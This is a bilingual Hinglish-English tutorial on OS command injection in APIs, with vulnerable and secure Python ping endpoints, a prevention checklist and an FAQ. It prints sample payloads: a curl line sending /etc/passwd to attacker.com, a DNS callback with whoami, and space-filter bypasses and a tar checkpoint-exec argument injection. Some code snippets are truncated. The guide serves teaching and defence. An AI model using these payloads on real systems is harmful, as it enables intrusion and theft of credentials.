📖 Command Injection Kya Hai? What is Command Injection in Modern APIs?

OS Command Injection (CWE-78) tab hota hai jab application layer operating system ke native shell commands execute karne ke liye user ke dwara diye gaye inputs ko direct string concatenation ke zariye shell interpreter (jaise /bin/sh, /bin/bash, ya Windows cmd.exe) ko pass kar deti hai. Attacker shell metacharacters jaise ;, &&, ||, |, ya `command` inject karke original command ke baad apne manchahe system commands execute karwa deta hai. OS Command Injection (CWE-78) occurs when an application constructs operating system shell commands using unvalidated, untrusted user inputs and submits them directly to a system shell interpreter (such as /bin/sh, /bin/bash, or Windows cmd.exe). Attackers utilize shell metacharacters such as ;, &&, ||, |, or `command` to chain arbitrary commands directly onto the host operating system.

Modern APIs Me Command Execution Kaha Hoti Hai? Where Does Command Execution Occur in Modern APIs?

Bahut se developers sochte hain ki modern microservices sirf pure JSON aur database queries use karti hain, isliye command injection purani baat ho chuki hai. Lekin real-world production systems me kai common use-cases me system binaries invoke hoti hain: Many engineers mistakenly believe modern microservices interact solely via clean JSON and ORMs, assuming command injection is obsolete. In enterprise production environments, APIs regularly spawn background CLI processes for specialized operations:

  • Network Diagnostics Endpoints: Ping utilities, traceroute, DNS lookups (ping, nslookup, traceroute, dig) in cloud monitoring or telecom dashboards.
  • Document & Report Generation: Converting HTML/Markdown to PDF via CLI wrappers like wkhtmltopdf, pandoc, ya libreoffice --headless.
  • Media Transcoding & Compression: Audio/video processing APIs executing ffmpeg, ffprobe, sox, ya image manipulation with convert / ImageMagick.
  • Archive & Cloud Backup Automation: Packaging user logs or exports using tar -czf, zip, pg_dump, ya rclone.
  • Git & CI/CD Webhooks: Auto-deploy scripts triggering git clone, kubectl apply, ya helm upgrade based on webhook payload attributes.
⚠️ Maximum Impact: Full Remote Code Execution (RCE)

Command Injection direct server compromise create karta hai. Attacker environment variables (AWS keys, database passwords, JWT secrets) chura sakta hai, reverse shell se server par interactive access le sakta hai, internal network me lateral movement kar sakta hai, ya data tamper karke ransomware deploy kar sakta hai. Command Injection triggers immediate host infrastructure compromise. Adversaries can dump environment secrets (cloud IAM keys, database credentials, token secrets), establish persistent reverse shells, pivot across internal subnets, or deploy ransomware payloads directly onto container nodes.

⚙️ Command Injection Ki Mechanics Anatomy & Shell Evaluation Mechanics

Jab Python me subprocess.Popen("ping -c 1 " + host, shell=True) ya Node.js me child_process.exec("ping -c 1 " + host) likha jata hai, toh operating system ek actual shell process spawn karta hai (/bin/sh -c "..."). Shell interpreter pure string ko analyze karta hai aur operators ke milte hi command execution stream ko split kar deta hai. When developers invoke subprocess.Popen("ping -c 1 " + host, shell=True) in Python or child_process.exec("ping -c 1 " + host) in Node.js, the operating system launches a system shell wrapper (/bin/sh -c "..."). The shell parses command line tokens and splits execution control upon encountering command delimiters.

Shell Metacharacters & Delimiters Matrix Shell Metacharacters & Operator Table

Operator Behavior / Syntax Exploit Example Shell Context
; Sequential execution (first finishes, next runs regardless of status) 8.8.8.8 ; id Unix / Linux
&& Logical AND (second command runs only if first succeeds) 127.0.0.1 && whoami Unix & Windows
|| Logical OR (second command runs if first fails) invalid-host || cat /etc/passwd Unix & Windows
| Pipes stdout of first command into stdin of second 8.8.8.8 | uname -a Unix & Windows
`cmd` or $(cmd) Command substitution (evaluates inner command first and places result in-line) $(whoami).attacker.com Unix / Linux
(%0a) Newline terminates line and triggers execution in shell scripts 8.8.8.8%0aid Unix / Linux

In-Band vs. Blind Command Injection In-Band vs. Blind Command Injection

1. In-Band (Direct Output): Jab API response me command ka stdout/stderr direct return ho jata hai (jaise diagnostics logs me terminal output aana). Yaha attacker directly cat /etc/passwd ka content HTTP response me padh leta hai. 1. In-Band (Direct Output): When the API endpoint directly reflects standard output (stdout) or error streams (stderr) within the JSON response payload. The attacker observes immediate results (e.g., directory listings or system identity).

2. Blind Command Injection: Jab API output suppress kar deti hai aur sirf {"status": "queued"} ya {"success": true} return karti hai. Yaha verification ke do methods hote hain: 2. Blind Command Injection: When the API suppresses command output, returning generic acknowledgment messages. Exploitation is confirmed through side-channel techniques:

  • Time Delays: Injecting sleep primitives like ; sleep 10. Agar API response exact 10 seconds baad aaye, toh injection confirm ho jata hai.
  • Out-of-Band (OOB) Exfiltration: Attacker server se external callback trigger karta hai: ; curl -X POST -d @/etc/passwd https://attacker.com/leak ya DNS lookup: ; ping -c 1 $(whoami).burpcollaborator.net.

1. Python (FastAPI / Subprocess)

❌ VULNERABLE: shell=True String Formatting Python 
import subprocess
from fastapi import FastAPI, HTTPException

@app.post("/api/v1/diagnostics/ping")

    # 🚨 CRITICAL FLAW: shell=True interprets metacharacters!

    output = subprocess.check_output(cmd, shell=True)
    return {"result": output.decode()}
✅ SECURE: shell=False + Argument Array + Regex Python 
import subprocess
import re
from ipaddress import ip_address

@app.post("/api/v1/diagnostics/ping")
def ping_host(payload: PingRequest):
    # 1. Strict Allowlist Validation (IP only)
    try:
        ip_address(payload.host)
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid IP address format")

    # 2. shell=False (Default): OS treats every element as pure argument
    result = subprocess.run(
        ["ping", "-c", "2", payload.host],
        shell=False,
        capture_output=True,
        text=True,
        timeout=5
    )
    return {"result": result.stdout}

const { execFile } = require('child_process');
const validator = require('validator');

app.post('/api/v1/diagnostics/ping', (req, res) => {

  execFile('ping', ['-c', '2', req.body.host], { timeout: 5000 }, (err, stdout) => {

  });

📋 Command Injection Audit & Review Checklist Command Injection Prevention Checklist

0 of 8 Checks Audited
1
Avoid Shell Execution: Enforce shell=False / execFile()

Ensure native subprocess APIs are called with an argument list rather than a single concatenated string through a shell interpreter.

Verification Tip: Search codebase for shell=True, os.system(, os.popen(, child_process.exec(, Runtime.getRuntime().exec(.
2
Strict Positive Allowlisting for CLI Arguments

Never rely on blacklisting operators like ; or |. Enforce strict character allowlists (e.g. ^[a-zA-Z0-9._-]+$).

Verification Tip: Verify schema validators (Pydantic / Zod) reject spaces, backticks, newlines, and shell punctuation before execution.
3
Prefer Native Language Libraries Over External Binaries

Replace system CLI calls with in-process SDKs (e.g. use Python ping3 instead of /bin/ping, sharp instead of convert).

Verification Tip: Audit dependencies to eliminate direct reliance on host operating system binaries.
4
Least Privilege Execution (Non-Root Containers)

Run API processes inside containers under an unprivileged user (USER node or USER appuser), never root.

Verification Tip: Check Dockerfile for explicit non-root user declaration and read-only root filesystems (readOnlyRootFilesystem: true).
5
Process Timeout & Resource Constraints

Mandate explicit timeouts on any spawned child processes to prevent catastrophic denial of service via long-running sleep commands.

Verification Tip: Ensure timeout=5 is specified in all subprocess configurations.
6
Prevent Argument Injection (Flag Manipulation)

Even with shell=False, user inputs starting with dashes (--config or -v) can alter program execution logic.

Verification Tip: Prefix command arguments with -- delimiter to indicate the termination of option flags.
7
Restrict Outbound Egress Traffic

Lock down container egress network rules via cloud security groups or Kubernetes NetworkPolicies so injected commands cannot call home.

Verification Tip: Verify container pods cannot initiate outbound connections to arbitrary public IPs or ports.
8
Audit Logging for All System Invocation Calls

Log execution details, user IDs, timestamps, and return codes into centralized immutable SIEM logs for rapid incident triage.

Verification Tip: Confirm security alerts trigger when non-zero exit codes or suspicious commands occur.

❓ Frequently Asked Questions Technical FAQ & Security Interviews

Q1: Agar space character block ho toh attacker commands kaise separate karta hai? ↓
Answer: Linux shells me space ke kai built-in alternatives hote hain:
1. ${IFS} (Internal Field Separator): cat${IFS}/etc/passwd
2. Redirection operators: cat</etc/passwd
3. Brace expansion: {cat,/etc/passwd} Isi wajah se space ya single characters ko blacklist karna kabhi secure defense nahi hota. Answer: Linux shells support multiple whitespace substitution mechanisms:
1. ${IFS} (Internal Field Separator): cat${IFS}/etc/passwd
2. Input redirection: cat</etc/passwd
3. Brace expansion: {cat,/etc/passwd} Blacklisting whitespace or individual characters fails against seasoned attackers.
Q2: Kya shell=False use karne ke baad bhi koi vulnerability ho sakti hai? ↓
Answer: Haan! Usse Argument Injection kehte hain. Agar user parameter bina hyphen check ke pass ho raha ho, toh attacker binary flags inject kar sakta hai (jaise tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh ya curl -o /path/malicious.php). Isliye hamesha argument list se pehle -- separator lagayein aur strict allowlisting use karein. Answer: Yes, via Argument Injection. If untrusted inputs start with dashes (e.g. --help or -v), attackers can manipulate binary execution flags. For instance, tar allows command execution through checkpoint options. Always delimit positional parameters with -- and validate inputs strictly.
Q3: Windows IIS / .NET APIs me Command Injection kaise behave karta hai? ↓
Answer: Windows me cmd.exe semicolon (;) ko command separator support nahi karta; waha &, &&, ya | use hota hai (jaise 8.8.8.8 & whoami ya 127.0.0.1 & dir C:\). PowerShell me semicolon aur backtick dono kaam karte hain. Answer: Windows cmd.exe does not recognize semicolons (;) as command delimiters. Instead, attackers use ampersands (&, &&) or pipes (|) like 8.8.8.8 & whoami. Under PowerShell, semicolons and backticks operate natively.
Q4: Command Injection aur Code Injection me kya farak hai? ↓
Answer: Code Injection me attacker application ke runtime language me code inject karta hai (jaise Python eval(), PHP assert(), Node.js eval()). Jabki Command Injection me application operating system shell binaries ko trigger karti hai. Answer: Code Injection injects statements into the programming language runtime itself (e.g., Python eval() or Node.js Function()). Command Injection forces the host operating system shell to execute native system executables.
